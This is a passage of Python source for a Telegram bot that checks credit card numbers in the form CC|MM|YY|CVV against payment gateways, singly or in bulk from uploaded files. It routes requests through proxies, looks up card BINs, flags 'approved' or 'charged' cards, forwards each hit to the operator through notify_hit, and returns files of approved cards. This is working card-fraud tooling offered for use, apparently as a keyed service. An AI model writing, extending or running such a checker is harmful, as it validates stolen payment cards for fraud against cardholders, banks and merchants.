                send_message(chat_id, f"<b>Invalid format.</b>\n\nUse: <code>{cmd_base} CC|MM|YY|CVV</code>\n\n<i>{DEVELOPER}</i>")
                return

            send_message(chat_id, f"<b>Checking...</b>\n<code>{cc_input}</code>")

            def _single_check():
                proxies_list = list(_global_proxies) if _global_proxies else []
                result = process_single_entry(cc_input, proxies_list, user_id, gate=gate)
                r_lower = result.lower()
                if r_lower.startswith("approved") or r_lower.startswith("charged"):
                    status = "APPROVED"
                elif "skipped" in r_lower:
                    status = "SKIPPED"
                elif "error" in r_lower:
                    status = "ERROR"
                else:
                    status = "DECLINED"

                detail = result.split(" | ", 1)[1] if " | " in result else result
                elapsed = ""
                if " | " in detail:
                    p = detail.rsplit(" | ", 1)
                    if len(p) == 2:
                        elapsed = p[1]

                bin6 = cc_input.split("|")[0][:6]
                name = f"@{username}" if username else str(user_id)

                bin_info = ""
                try:
                    bi, _ = bin_lookup(bin6)
                    if bi:
                        bin_info = f"{bi.get('brand','?')} - {bi.get('bank','?')} - {bi.get('country','?')} {bi.get('emoji','')}"
                except Exception:
                    pass

                if status == "APPROVED":
                    msg_text = (
                        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
                        f"[🝂] CARD: <code>{cc_input}</code>\n"
                        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
                        f"[🝂] STATUS: <b>APPROVED ✅</b>\n"
                        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
                        f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
                        f"[🝂] BIN: <code>{bin_info or bin6}</code>\n"
                        f"[🝂] TIME TOOK: <code>{elapsed}</code>\n"
                        f"[🝂] CHECKED BY: {name}\n\n"
                        f"<i>{DEVELOPER}</i>"
                    )
                else:
                    status_emoji = "❌" if status == "DECLINED" else "⚠️"
                    msg_text = (
                        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
                        f"[🝂] CARD: <code>{cc_input}</code>\n"
                        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
                        f"[🝂] STATUS: <b>{status} {status_emoji}</b>\n"
                        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
                        f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
                        f"[🝂] BIN: <code>{bin_info or bin6}</code>\n"
                        f"[🝂] TIME TOOK: <code>{elapsed}</code>\n"
                        f"[🝂] CHECKED BY: {name}\n\n"
                        f"<i>{DEVELOPER}</i>"
                    )

                send_message(chat_id, msg_text)

                if status == "APPROVED":
                    notify_hit(user_id, username, gate_label, cc_input, result)

            threading.Thread(target=_single_check, daemon=True).start()
            return

        # Bulk mode
        reply = msg.get("reply_to_message")
        if not reply or not reply.get("document"):
            send_message(chat_id,
                f"<b>Usage</b>\n\n"
                f"<b>Single:</b> <code>{cmd_base} CC|MM|YY|CVV</code>\n"
                f"<b>Bulk:</b> Reply to a .txt file with <code>{cmd_base}</code>\n\n"
                f"<i>{DEVELOPER}</i>")
            return

        doc = reply["document"]
        fname = doc.get("file_name", "")
        if not fname.lower().endswith(".txt"):
            send_message(chat_id, f"<b>Only .txt files are accepted.</b>\n\n<i>{DEVELOPER}</i>")
            return

        with active_lock:
            if user_id in active_users:
                send_message(chat_id, f"<b>You already have a task running.</b>\n\n<i>{DEVELOPER}</i>")
                return
            active_users.add(user_id)

        cancel_flags.pop(user_id, None)

        content = download_file(doc["file_id"])
        if not content:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, f"<b>Failed to download file.</b>\n\n<i>{DEVELOPER}</i>")
            return

        file_lines = [l.strip() for l in content.splitlines() if l.strip()]
        if not file_lines:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, f"<b>File is empty.</b>\n\n<i>{DEVELOPER}</i>")
            return

        user_limit = get_user_line_limit(user_id)
        if user_limit and len(file_lines) > user_limit:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id,
                f"<b>File Too Large</b>\n\n"
                f"Your key allows <code>{user_limit}</code> lines.\n"
                f"Your file has <code>{len(file_lines)}</code> lines.\n\n"
                f"<i>{DEVELOPER}</i>")
            return

        init_resp = send_message(
            chat_id,
            f"Starting — <b>{gate_label}</b>...",
            reply_markup=stop_button_markup(user_id)
        )
        progress_msg_id = init_resp.get("result", {}).get("message_id")

        def _run(gate=gate, gate_label=gate_label):
            start_time = time.time()
            last_edit_time = [0]

            def on_progress(idx, total, results, entry, status, detail):
                if status == "APPROVED":
                    status_text = "APPROVED — " + detail
                elif status == "DECLINED":
                    status_text = "DECLINED — " + detail
                elif status == "SKIPPED":
                    status_text = "SKIPPED — " + detail
                else:
                    status_text = "ERROR — " + detail

                if status == "APPROVED":
                    bin6 = entry.split("|")[0][:6] if "|" in entry else entry[:6]
                    name = f"@{username}" if username else str(user_id)
                    elapsed_h = ""
                    if " | " in detail:
                        p = detail.rsplit(" | ", 1)
                        if len(p) == 2:
                            elapsed_h = p[1]
                    send_message(chat_id,
                        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
                        f"[🝂] CARD: <code>{entry}</code>\n"
                        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
                        f"[🝂] STATUS: <b>APPROVED ✅</b>\n"
                        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
                        f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
                        f"[🝂] BIN: <code>{bin6}</code>\n"
                        f"[🝂] TIME TOOK: <code>{elapsed_h}</code>\n"
                        f"[🝂] CHECKED BY: {name}\n"
                        f"[{idx}/{total}]\n\n"
                        f"<i>{DEVELOPER}</i>")
                    notify_hit(user_id, username, gate_label, entry, detail)

                now = time.time()
                if progress_msg_id and (now - last_edit_time[0] >= 3 or idx == total):
                    last_edit_time[0] = now
                    markup = None if idx == total else stop_button_markup(user_id)
                    edit_message(
                        chat_id,
                        progress_msg_id,
                        fmt_live(idx, total, results, start_time, entry=entry, status_text=status_text, done=(idx == total)),
                        reply_markup=markup)

            def on_complete(results):
                cancel_flags.pop(user_id, None)
                update_user_stats(user_id, results)
                update_gate_stats(gate, results)

                if progress_msg_id:
                    edit_message(
                        chat_id, progress_msg_id,
                        fmt_live(results['total'], results['total'], results, start_time,
                                 entry="Finished", status_text="Completed", done=True))

                send_message(chat_id, fmt_results(results))

                if results["approved_list"]:
                    filename = f"approved_{int(time.time())}.txt"
                    filepath = os.path.join(DATA_DIR, filename)
                    with open(filepath, "w") as f:
                        for e in results["approved_list"]:
                            f.write(e + "\n")
                    send_document(chat_id, filepath)

                with active_lock:
                    active_users.discard(user_id)

            run_processing(file_lines, user_id, on_progress=on_progress, on_complete=on_complete, gate=gate)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        return


# ============================================================
#  Polling loop
# ============================================================
def main():
    print(f"[Bot] Starting — {DEVELOPER}")
    load_global_proxies()
    print(f"[Bot] Polling for updates...")

    offset = 0
    while True:
        try:
            resp = tg_request("getUpdates", offset=offset, timeout=30)
            updates = resp.get("result", [])
            for upd in updates:
                offset = upd["update_id"] + 1
                try:
                    handle_update(upd)
                except Exception as e:
                    print(f"[Bot] Error handling update: {e}")
        except KeyboardInterrupt:
            print("\n[Bot] Stopped.")
            break
        except Exception as e:
            print(f"[Bot] Polling error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
